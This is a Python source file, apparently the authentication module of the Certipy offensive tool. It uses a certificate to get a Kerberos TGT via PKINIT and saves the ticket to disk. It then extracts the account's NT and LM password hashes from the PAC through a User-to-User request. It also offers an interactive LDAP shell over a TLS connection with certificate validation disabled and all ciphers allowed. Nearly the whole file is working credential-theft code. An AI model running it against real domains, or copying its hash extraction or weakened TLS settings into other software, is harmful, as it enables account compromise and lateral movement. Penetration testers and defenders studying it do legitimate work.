"""
Kerberos PKINIT and Schannel Authentication Module for Certipy.

This module provides functionality for certificate-based Kerberos authentication:
- PKINIT authentication using certificates
- NT hash extraction via Kerberos U2U
- LDAPS (Schannel) authentication using certificates
- Interactive LDAP shell

It supports various authentication workflows for penetration testing and security assessments.
"""

import argparse
import base64
import datetime
import os
import ssl
import sys
import tempfile
from random import getrandbits
from typing import Optional, Union

import ldap3
from asn1crypto import cms, core
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric.types import PrivateKeyTypes
from impacket.dcerpc.v5.rpcrt import TypeSerialization1
from impacket.examples.ldap_shell import LdapShell as _LdapShell
from impacket.krb5 import constants
from impacket.krb5.asn1 import (
    AD_IF_RELEVANT,
    AP_REQ,
    AS_REP,
    TGS_REP,
    TGS_REQ,
    Authenticator,
    EncASRepPart,
    EncTicketPart,
)
from impacket.krb5.asn1 import Ticket as TicketAsn1
from impacket.krb5.asn1 import seq_set, seq_set_iter
from impacket.krb5.ccache import CCache
from impacket.krb5.crypto import Key, _enctype_table
from impacket.krb5.kerberosv5 import KerberosError, sendReceive
from impacket.krb5.pac import (
    NTLM_SUPPLEMENTAL_CREDENTIAL,
    PAC_CREDENTIAL_DATA,
    PAC_CREDENTIAL_INFO,
    PAC_INFO_BUFFER,
    PACTYPE,
)
from impacket.krb5.types import KerberosTime, Principal, Ticket
from ldap3.core.exceptions import LDAPUnavailableResult
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue

from certipy.lib.certificate import (
    cert_id_to_parts,
    cert_to_pem,
    get_identifications_from_certificate,
    get_object_sid_from_certificate,
    hash_digest,
    hashes,
    key_to_pem,
    load_pfx,
    x509,
)
from certipy.lib.errors import KRB5_ERROR_MESSAGES
from certipy.lib.logger import logging
from certipy.lib.pkinit import build_pkinit_as_req
from certipy.lib.structs import PA_PK_AS_REP, Enctype, KDCDHKeyInfo, e2i
from certipy.lib.target import Target


class LdapShell(_LdapShell):
    """
    Enhanced LDAP shell for interactive administration.

    This shell provides a command-line interface for interacting with LDAP
    after successfully authenticating with a certificate.
    """

    def __init__(self, tcp_shell, domain_dumper, client):
        """
        Initialize the LDAP shell.

        Args:
            tcp_shell: Shell to use for I/O
            domain_dumper: Domain information provider
            client: LDAP client connection
        """
        super().__init__(tcp_shell, domain_dumper, client)

        self.use_rawinput = True
        self.shell = tcp_shell
        self.prompt = "\n# "
        self.tid = None
        self.intro = "Type help for list of commands"
        self.loggedIn = True
        self.last_output = None
        self.completion = []
        self.client = client
        self.domain_dumper = domain_dumper

    def do_dump(self, line):
        """
        Placeholder for domain dumping functionality.

        Args:
            line: Command line input
        """
        logging.warning("Not implemented")

    def do_exit(self, line):
        """
        Exit the shell.

        Args:
            line: Command line input

        Returns:
            True to signal shell exit
        """
        print("Bye!")
        return True


class DummyDomainDumper:
    """
    Simple domain information provider for the LDAP shell.

    This class provides minimal domain information required by the LDAP shell.
    """

    def __init__(self, root: str):
        """
        Initialize with domain root.

        Args:
            root: LDAP root path (e.g., DC=contoso,DC=com)
        """
        self.root = root


def truncate_key(value: bytes, keysize: int) -> bytes:
    """
    Truncate a key to the specified size using SHA1 hashing.

    Args:
        value: Input key material
        keysize: Desired key size in bytes

    Returns:
        Truncated key of exactly keysize bytes
    """
    output = b""
    current_num = 0

    while len(output) < keysize:
        current_digest = hash_digest(bytes([current_num]) + value, hashes.SHA1)

        if len(output) + len(current_digest) > keysize:
            output += current_digest[: keysize - len(output)]
            break

        output += current_digest
        current_num += 1

    return output


class Authenticate:
    """
    Main authentication class for certificate-based Kerberos and LDAP authentication.

    This class provides functionality to:
    - Authenticate to Kerberos using certificates (PKINIT)
    - Extract NT hashes from Kerberos tickets
    - Connect to LDAP using certificate authentication
    - Launch interactive LDAP shells
    """

    def __init__(
        self,
        target: Optional[Target] = None,
        pfx: Optional[str] = None,
        password: Optional[str] = None,
        cert: Optional[x509.Certificate] = None,
        key: Optional[PrivateKeyTypes] = None,
        no_save: bool = False,
        no_hash: bool = False,
        print: bool = False,
        kirbi: bool = False,
        ldap_shell: bool = False,
        ldap_port: int = 0,
        ldap_scheme: str = "ldaps",
        ldap_user_dn: Optional[str] = None,
        user_dn: Optional[str] = None,
        debug: bool = False,
        **kwargs,
    ):
        """
        Initialize authentication parameters.

        Args:
            target: Target information (domain, DC IP, etc.)
            pfx: Path to PFX/P12 certificate file
            password: Password for PFX file
            cert: Pre-loaded certificate object
            key: Pre-loaded private key object
            no_save: Don't save credential cache to disk
            no_hash: Don't extract NT hash
            print: Print ticket information
            kirbi: Save credential cache in Kirbi format
            ldap_shell: Launch interactive LDAP shell after authentication
            ldap_port: LDAP port (default: 389 for ldap, 636 for ldaps)
            ldap_scheme: LDAP scheme (ldap or ldaps)
            ldap_user_dn: LDAP user distinguished name
            user_dn: User distinguished name
            debug: Enable verbose debugging
            **kwargs: Additional parameters
        """
        self.target = target
        self.pfx = pfx
        self.password = password
        self.cert = cert
        self.key = key
        self.no_save = no_save
        self.no_hash = no_hash
        self.print = print
        self.kirbi = kirbi
        self.ldap_shell = ldap_shell
        self.ldap_port = (
            ldap_port if ldap_port != 0 else (389 if ldap_scheme == "ldap" else 636)
        )
        self.ldap_scheme = ldap_scheme
        self.ldap_user_dn = ldap_user_dn
        self.user_dn = user_dn
        self.verbose = debug
        self.kwargs = kwargs

        # These will be populated during authentication
        self.nt_hash: Optional[str] = None
        self.lm_hash: Optional[str] = None
        self.ccache_name: Optional[str] = None

        # Load certificate and key from PFX if provided
        if self.pfx is not None:
            pfx_password = None
            if self.password:
                pfx_password = self.password.encode()

            try:
                with open(self.pfx, "rb") as f:
                    pfx_data = f.read()
                self.key, self.cert = load_pfx(pfx_data, pfx_password)
            except Exception as e:
                logging.error(f"Failed to load PFX file: {e}")
                raise

    def authenticate(
        self,
        username: Optional[str] = None,
        domain: Optional[str] = None,
        is_key_credential: bool = False,
    ) -> Union[str, bool, None]:
        """
        Authenticate using a certificate.

        This is the main entry point for authentication. It will determine
        whether to use LDAP or Kerberos authentication based on configuration.

        Args:
            username: Username to authenticate as
            domain: Domain to authenticate to
            is_key_credential: Whether we're using a key credential

        Returns:
            NT hash if extracted, True if successful, False if failed, None if error
        """
        # Resolve username and domain from target if not provided
        if username is None:
            if self.target is None:
                raise ValueError("Username is not specified and no target was provided")
            if self.target.username is None:
                raise ValueError(
                    "Username is not specified and no username was provided in the target"
                )
            username = self.target.username

        if domain is None:
            if self.target is None:
                raise ValueError("Domain is not specified and no target was provided")
            if self.target.domain is None:
                raise ValueError(
                    "Domain is not specified and no domain was provided in the target"
                )
            domain = self.target.domain

        # Use LDAP authentication if requested
        if self.ldap_shell:
            return self.ldap_authentication(domain)

        # Extract identification information from certificate if needed
        id_type = None
        identification = None
        object_sid = None

        if not is_key_credential:
            if self.cert is None:
                raise ValueError("Certificate is not specified and no PFX was provided")

            identifications = get_identifications_from_certificate(self.cert)

            # Handle multiple identifications in the certificate
            if len(identifications) > 1:
                logging.info("Found multiple identifications in certificate")

                while True:
                    logging.info("Please select one:")
                    for i, identification_pair in enumerate(identifications):
                        id_t, id_value = identification_pair
                        print(f"    [{i}] {id_t}: {repr(id_value)}")

                    try:
                        idx = int(input("> "))
                        if idx >= len(identifications):
                            logging.warning("Invalid index")
                        else:
                            id_type, identification = identifications[idx]
                            break
                    except ValueError:
                        logging.warning("Invalid input, enter a number")

            elif len(identifications) == 1:
                id_type, identification = identifications[0]
            else:
                id_type, identification = None, None

            # Parse username and domain from certificate
            cert_username, cert_domain = cert_id_to_parts([(id_type, identification)])
            object_sid = get_object_sid_from_certificate(self.cert)

            # Warn if no identification found
            if not any([cert_username, cert_domain]):
                logging.warning(
                    "Could not find identification in the provided certificate"
                )

            # Use certificate-provided username if not specified
            if not username:
                username = cert_username
            elif cert_username:
                # Warn if provided username doesn't match certificate
                if username.lower() not in [
                    cert_username.lower(),
                    cert_username.lower() + "$",
                ]:
                    logging.warning(
                        "The provided username does not match the identification "
                        f"found in the provided certificate: {repr(username)} - {repr(cert_username)}"
                    )
                    res = input("Do you want to continue? (Y/n) ").rstrip("\n")
                    if res.lower() == "n":
                        return False

            # Use certificate-provided domain if not specified
            if not domain:
                domain = cert_domain
            elif cert_domain:
                # Warn if provided domain doesn't match certificate
                if (
                    domain.lower() != cert_domain.lower()
                    and not cert_domain.lower().startswith(
                        domain.lower().rstrip(".") + "."
                    )
                ):
                    logging.warning(
                        "The provided domain does not match the identification "
                        f"found in the provided certificate: {repr(domain)} - {repr(cert_domain)}"
                    )
                    res = input("Do you want to continue? (Y/n) ").rstrip("\n")
                    if res.lower() == "n":
                        return False

        # Ensure we have both username and domain
        if not all([username, domain]) and not is_key_credential:
            logging.error(
                "Username or domain is not specified, and identification "
                "information was not found in the certificate"
            )
            return False

        if not any([len(username or ""), len(domain or "")]):
            logging.error(f"Username or domain is invalid: {username}@{domain}")
            return False

        # Normalize domain and username
        domain = (domain or "").lower()
        username = (username or "").lower()
        upn = f"{username}@{domain}"

        # Resolve target IP if needed
        if self.target and self.target.resolver and self.target.target_ip is None:
            self.target.target_ip = self.target.resolver.resolve(domain)

        logging.info(f"Using principal: {upn}")

        # Perform Kerberos authentication
        return self.kerberos_authentication(
            username,
            domain,
            is_key_credential,
            id_type,
            identification,
            object_sid,
            upn,
        )

    def ldap_authentication(self, domain: Optional[str] = None) -> bool:
        """
        Authenticate to LDAP using a certificate.

        Args:
            domain: Domain to authenticate to

        Returns:
            True if successful, False otherwise
        """
        if self.key is None:
            raise ValueError("Private key is not specified and no PFX was provided")
        if self.cert is None:
            raise ValueError("Certificate is not specified and no PFX was provided")

        # Create temporary files for certificate and key
        key_file = tempfile.NamedTemporaryFile(delete=False)
        _ = key_file.write(key_to_pem(self.key))
        key_file.close()

        cert_file = tempfile.NamedTemporaryFile(delete=False)
        _ = cert_file.write(cert_to_pem(self.cert))
        cert_file.close()

        try:
            # Configure SASL credentials if user DN is specified
            sasl_credentials = None
            if self.ldap_user_dn:
                sasl_credentials = f"dn:{self.ldap_user_dn}"

            # Configure TLS settings
            tls = ldap3.Tls(
                local_private_key_file=key_file.name,
                local_certificate_file=cert_file.name,
                validate=ssl.CERT_NONE,
                ciphers="ALL:@SECLEVEL=0",
            )

            if self.target is None:
                raise ValueError("Target is not specified")

            # Determine host to connect to
            host = self.target.target_ip
            if host is None:
                host = domain

            if host is None:
                raise ValueError("Target IP or domain is not specified")

            # Connect to LDAP server
            logging.info(
                f"Connecting to {repr(f'{self.ldap_scheme}://{host}:{self.ldap_port}')}"
            )

            ldap_server = ldap3.Server(
                host=host,
                get_info=ldap3.ALL,
                use_ssl=True if self.ldap_scheme == "ldaps" else False,
                port=self.ldap_port,
                tls=tls,
                connect_timeout=self.target.timeout,
            )

            # Configure authentication parameters
            conn_kwargs = {}
            if self.ldap_scheme == "ldap":
                conn_kwargs = {
                    "authentication": ldap3.SASL,
                    "sasl_mechanism": ldap3.EXTERNAL,
                    "auto_bind": ldap3.AUTO_BIND_TLS_BEFORE_BIND,
                    "sasl_credentials": sasl_credentials,
                }

            try:
                # Create LDAP connection
                ldap_conn = ldap3.Connection(
                    ldap_server,
                    raise_exceptions=True,
                    receive_timeout=self.target.timeout * 10,
                    **conn_kwargs,
                )
            except LDAPUnavailableResult as e:
                logging.error("LDAP not configured for SSL/TLS connections")
                if self.verbose:
                    raise e
                return False

            # Establish connection
            if self.ldap_scheme == "ldaps":
                ldap_conn.open()

            # Get authenticated identity
            who_am_i = ldap_conn.extend.standard.who_am_i()
            logging.info(
                f"Authenticated to {repr(self.target.target_ip)} as: {who_am_i}"
            )

            # Launch interactive shell
            root = ldap_server.info.other["defaultNamingContext"][0]
            domain_dumper = DummyDomainDumper(root)
            ldap_shell = LdapShell(sys, domain_dumper, ldap_conn)

            try:
                ldap_shell.cmdloop()
            except KeyboardInterrupt:
                print("Bye!\n")

            return True

        finally:
            # Clean up temporary files
            try:
                os.unlink(key_file.name)
                os.unlink(cert_file.name)
            except Exception:
                pass

    def kerberos_authentication(
        self,
        username: str,
        domain: str,
        is_key_credential: bool = False,
        id_type: Optional[str] = None,
        identification: Optional[str] = None,
        object_sid: Optional[str] = None,
        upn: Optional[str] = None,
    ) -> Union[str, bool, None]:
        """
        Authenticate to Kerberos using PKINIT with a certificate.

        Args:
            username: Username to authenticate as
            domain: Domain to authenticate to
            is_key_credential: Whether we're using a key credential
            id_type: Type of identification in certificate
            identification: Identification value from certificate
            object_sid: SID from certificate
            upn: User Principal Name

        Returns:
            NT hash if extracted, True if successful, False otherwise
        """
        if self.key is None:
            raise ValueError("Private key is not specified and no PFX was provided")

        if self.cert is None:
            raise ValueError("Certificate is not specified and no PFX was provided")

        if not isinstance(self.key, rsa.RSAPrivateKey):
            raise ValueError("Currently only RSA private keys are supported.")

        if self.target is None:
            raise ValueError("Target is not specified")

        # Create AS-REQ for PKINIT
        as_req, diffie = build_pkinit_as_req(username, domain, self.key, self.cert)

        # Resolve target IP if needed
        if self.target and self.target.resolver and self.target.target_ip is None:
            self.target.target_ip = self.target.resolver.resolve(domain)

        logging.info("Trying to get TGT...")
        logging.debug(f"Sending AS-REQ to KDC {domain} ({self.target.target_ip})")

        try:
            # Send Kerberos AS-REQ
            tgt = sendReceive(as_req, domain, self.target.target_ip)
        except KerberosError as e:
            # Handle Kerberos errors with helpful messages
            if e.getErrorCode() not in KRB5_ERROR_MESSAGES:
                logging.error(f"Got unknown Kerberos error: {e.getErrorCode():#x}")
                return False

            if "KDC_ERR_CLIENT_NAME_MISMATCH" in str(e) and not is_key_credential:
                logging.error(
                    f"Name mismatch between certificate and user {repr(username)}"
                )
                if id_type is not None:
                    logging.error(
                        f"Verify that the username {repr(username)} matches the certificate {id_type}: {identification}"
                    )
            elif "KDC_ERR_WRONG_REALM" in str(e) and not is_key_credential:
                logging.error(f"Wrong domain name specified {repr(domain)}")
                if id_type is not None:
                    logging.error(
                        f"Verify that the domain {repr(domain)} matches the certificate {id_type}: {identification}"
                    )
            elif "KDC_ERR_CERTIFICATE_MISMATCH" in str(e) and not is_key_credential:
                logging.error(
                    f"Object SID mismatch between certificate and user {repr(username)}"
                )
                if object_sid is not None:
                    logging.error(
                        f"Verify that user {repr(username)} has object SID {repr(object_sid)}"
                    )
            else:
                logging.error(f"Got error while trying to request TGT: {str(e)}")

            return False

        logging.info("Got TGT")

        # Process AS-REP
        as_rep = decoder.decode(tgt, asn1Spec=AS_REP())[0]

        # Extract PA-PK-AS-REP
        for pa in as_rep["padata"]:
            if pa["padata-type"] == 17:  # PA-PK-AS-REP
                pk_as_rep = PA_PK_AS_REP.load(bytes(pa["padata-value"])).native
                break
        else:
            logging.error("PA_PK_AS_REP was not found in AS_REP")
            return False

        # Process Diffie-Hellman key exchange data
        ci = cms.ContentInfo.load(pk_as_rep["dhSignedData"]).native
        sd = ci["content"]
        key_info = sd["encap_content_info"]

        if key_info["content_type"] != "1.3.6.1.5.2.3.2":
            logging.error("Unexpected value for key info content type")
            return False

        # Get public key from KDC
        auth_data = KDCDHKeyInfo.load(key_info["content"]).native
        pub_key = int.from_bytes(
            core.BitString(auth_data["subjectPublicKey"]).dump()[7:],
            "big",
            signed=False,
        )

        # Complete Diffie-Hellman exchange
        shared_key = diffie.exchange(pub_key)
        server_nonce = pk_as_rep["serverDHNonce"]
        full_key = shared_key + diffie.dh_nonce + server_nonce

        # Derive encryption key
        etype = as_rep["enc-part"]["etype"]
        cipher = _enctype_table[etype]

        if etype == Enctype.AES256:
            t_key = truncate_key(full_key, 32)
        elif etype == Enctype.AES128:
            t_key = truncate_key(full_key, 16)
        else:
            logging.error("Unexpected encryption type in AS_REP")
            return False

        # Decrypt AS-REP
        key = Key(cipher.enctype, t_key)
        enc_data = as_rep["enc-part"]["cipher"]
        dec_data = cipher.decrypt(key, 3, enc_data)
        enc_as_rep_part = decoder.decode(dec_data, asn1Spec=EncASRepPart())[0]

        # Extract session key
        cipher = _enctype_table[int(enc_as_rep_part["key"]["keytype"])]
        session_key = Key(cipher.enctype, bytes(enc_as_rep_part["key"]["keyvalue"]))

        # Create credential cache
        ccache = CCache()
        ccache.fromTGT(tgt, key, None)
        krb_cred = ccache.toKRBCRED()

        # Print ticket if requested
        if self.print:
            logging.info("Ticket:")
            print(base64.b64encode(krb_cred).decode())

        # Save ticket to file if requested
        if not self.no_save:
            if self.kirbi:
                kirbi_name = f"{username.rstrip('$')}.kirbi"
                ccache.saveKirbiFile(kirbi_name)
                logging.info(f"Saved Kirbi file to {repr(kirbi_name)}")
            else:
                self.ccache_name = f"{username.rstrip('$')}.ccache"
                ccache.saveFile(self.ccache_name)
                logging.info(f"Saved credential cache to {repr(self.ccache_name)}")

        # Extract NT hash if requested
        if not self.no_hash:
            logging.info(f"Trying to retrieve NT hash for {repr(username)}")

            try:
                # Create AP-REQ for User-to-User (U2U) authentication
                ap_req = AP_REQ()
                ap_req["pvno"] = 5
                ap_req["msg-type"] = e2i(constants.ApplicationTagNumbers.AP_REQ)
                ap_req["ap-options"] = constants.encodeFlags([])

                # Use received ticket
                ticket = Ticket()
                ticket = ticket.from_asn1(as_rep["ticket"])
                seq_set(ap_req, "ticket", ticket.to_asn1)

                # Create authenticator for AP-REQ
                authenticator = Authenticator()
                authenticator["authenticator-vno"] = 5
                authenticator["crealm"] = bytes(as_rep["crealm"])

                client_name = Principal()
                client_name = client_name.from_asn1(as_rep, "crealm", "cname")
                seq_set(authenticator, "cname", client_name.components_to_asn1)

                # Set time in authenticator
                now = datetime.datetime.now(datetime.timezone.utc)
                authenticator["cusec"] = now.microsecond
                authenticator["ctime"] = KerberosTime.to_asn1(now)

                # Encrypt authenticator with session key
                encoded_authenticator = encoder.encode(authenticator)
                encrypted_encoded_authenticator = cipher.encrypt(
                    session_key, 7, encoded_authenticator, None
                )

                ap_req["authenticator"] = noValue
                ap_req["authenticator"]["etype"] = cipher.enctype
                ap_req["authenticator"]["cipher"] = encrypted_encoded_authenticator

                encoded_ap_req = encoder.encode(ap_req)

                # Create TGS-REQ with U2U flag
                tgs_req = TGS_REQ()
                tgs_req["pvno"] = 5
                tgs_req["msg-type"] = e2i(constants.ApplicationTagNumbers.TGS_REQ)

                # Add AP-REQ as PA data
                tgs_req["padata"] = noValue
                tgs_req["padata"][0] = noValue
                tgs_req["padata"][0]["padata-type"] = e2i(
                    constants.PreAuthenticationDataTypes.PA_TGS_REQ
                )

                tgs_req["padata"][0]["padata-value"] = encoded_ap_req

                req_body = seq_set(tgs_req, "req-body")

                # Set KDC options for U2U
                opts = [
                    e2i(constants.KDCOptions.forwardable),
                    e2i(constants.KDCOptions.renewable),
                    e2i(constants.KDCOptions.canonicalize),
                    e2i(constants.KDCOptions.enc_tkt_in_skey),  # This enables U2U
                    e2i(constants.KDCOptions.forwardable),
                    e2i(constants.KDCOptions.renewable_ok),
                ]
                req_body["kdc-options"] = constants.encodeFlags(opts)

                # Request a ticket to self (U2U)
                server_name = Principal(
                    username, type=e2i(constants.PrincipalNameType.NT_UNKNOWN)
                )
                seq_set(req_body, "sname", server_name.components_to_asn1)
                req_body["realm"] = str(as_rep["crealm"])

                # Set validity period
                now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(
                    days=1
                )
                req_body["till"] = KerberosTime.to_asn1(now)
                req_body["nonce"] = getrandbits(31)

                # Request supported encryption types
                seq_set_iter(
                    req_body,
                    "etype",
                    (int(cipher.enctype), e2i(constants.EncryptionTypes.rc4_hmac)),
                )

                # Include our own ticket
                ticket_asn1 = ticket.to_asn1(TicketAsn1())
                seq_set_iter(req_body, "additional-tickets", (ticket_asn1,))

                # Send TGS-REQ
                message = encoder.encode(tgs_req)
                tgs = sendReceive(message, domain, self.target.target_ip)
                tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]

                # Decrypt ticket from TGS-REP
                ciphertext = tgs["ticket"]["enc-part"]["cipher"]
                new_cipher = _enctype_table[int(tgs["ticket"]["enc-part"]["etype"])]
                plaintext = new_cipher.decrypt(session_key, 2, ciphertext)

                # Create special key using the t_key
                special_key = Key(18, t_key)

                # Extract PAC from ticket
                data = plaintext
                enc_ticket_part = decoder.decode(data, asn1Spec=EncTicketPart())[0]
                ad_if_relevant = decoder.decode(
                    enc_ticket_part["authorization-data"][0]["ad-data"],
                    asn1Spec=AD_IF_RELEVANT(),
                )[0]
                pac_type = PACTYPE(ad_if_relevant[0]["ad-data"].asOctets())
                buff = pac_type["Buffers"]

                # Default hash values
                nt_hash = None
                lm_hash = "aad3b435b51404eeaad3b435b51404ee"

                # Look for credential info in PAC
                for _ in range(pac_type["cBuffers"]):
                    info_buffer = PAC_INFO_BUFFER(buff)
                    data = pac_type["Buffers"][info_buffer["Offset"] - 8 :][
                        : info_buffer["cbBufferSize"]
                    ]

                    # PAC_CREDENTIAL_INFO contains the hashes
                    if info_buffer["ulType"] == 2:  # PAC_CREDENTIAL_INFO
                        cred_info = PAC_CREDENTIAL_INFO(data)
                        new_cipher = _enctype_table[cred_info["EncryptionType"]]

                        # Decrypt the credentials with the special key
                        out = new_cipher.decrypt(
                            special_key, 16, cred_info["SerializedData"]
                        )

                        # Parse credential data
                        type1 = TypeSerialization1(out)
                        new_data = out[len(type1) + 4 :]
                        pcc = PAC_CREDENTIAL_DATA(new_data)

                        # Extract NTLM hashes
                        for cred in pcc["Credentials"]:
                            cred_structs = NTLM_SUPPLEMENTAL_CREDENTIAL(
                                b"".join(cred["Credentials"])
                            )
                            if any(cred_structs["LmPassword"]):
                                lm_hash = cred_structs["LmPassword"].hex()
                            nt_hash = cred_structs["NtPassword"].hex()
                            break
                        break

                    # Move to next buffer
                    buff = buff[len(info_buffer) :]
                else:
                    logging.error("Could not find credentials in PAC")
                    return False

                # Store hashes in object
                self.lm_hash = lm_hash
                self.nt_hash = nt_hash

                # Display hash information
                if not is_key_credential:
                    logging.info(f"Got hash for {repr(upn)}: {lm_hash}:{nt_hash}")

                # Return the NT hash
                return nt_hash

            except Exception as e:
                logging.error(f"Failed to extract NT hash: {e}")
                if self.verbose:
                    import traceback

                    traceback.print_exc()
                return False

        # Authentication succeeded
        return True


def entry(options: argparse.Namespace) -> None:
    """
    Entry point for the 'auth' command.

    Args:
        options: Command-line arguments
    """
    # Ensure we don't try to use password authentication
    options.no_pass = True

    # Create target from options
    target = Target.create(
        domain=options.domain,
        username=options.username,
        dc_ip=options.dc_ip,
        target_ip=options.dc_ip,
        ns=options.ns,
        timeout=options.timeout,
        dns_tcp=options.dns_tcp,
        no_pass=True,
    )

    # Create authenticator and perform authentication
    try:
        authenticate = Authenticate(target=target, **vars(options))
        result = authenticate.authenticate()

        if result is False:
            sys.exit(1)
    except Exception as e:
        logging.error(f"Authentication failed: {e}")
        if options.debug:
            import traceback

            traceback.print_exc()
        sys.exit(1)
